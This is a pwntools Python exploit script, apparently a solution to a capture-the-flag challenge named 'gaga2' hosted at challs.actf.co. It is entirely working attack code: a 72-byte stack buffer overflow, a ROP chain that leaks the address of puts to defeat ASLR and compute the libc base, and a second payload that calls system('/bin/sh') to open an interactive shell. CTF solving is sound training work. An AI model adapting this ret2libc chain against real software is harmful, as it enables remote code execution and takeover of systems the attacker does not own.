from pwn import *

elf = context.binary = ELF('gaga2')
context.log_level = 'DEBUG'
#io = process('./gaga2')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc6_2.31-0ubuntu9.9_amd64.so')  
io = remote('challs.actf.co', 31302)
#io = remote('localhost, port)

ret = 0x000000000040101a
pop_rdi = 0x00000000004012b3
pop_rsi_r15 = 0x00000000004012b1

# Stage1: Leak libc

payload = 72*b'A'
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.symbols['puts'])

payload += p64(elf.symbols['main'])

io.sendline(payload)

io.recvline()
leak = io.recv()
print(leak)

puts_leak = u64(leak[12:18].ljust(8, b"\x00"))
print(hex(puts_leak))

libc_base = puts_leak - libc.symbols['puts']
print(hex(libc_base))

bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
system = libc_base + libc.symbols['system']
exit = libc_base + libc.symbols['exit']

payload1 = 72*b'A'
payload1 += p64(pop_rdi)
payload1 += p64(bin_sh)
payload1 += p64(ret)
payload1 += p64(system)

io.sendline(payload1)
io.interactive()
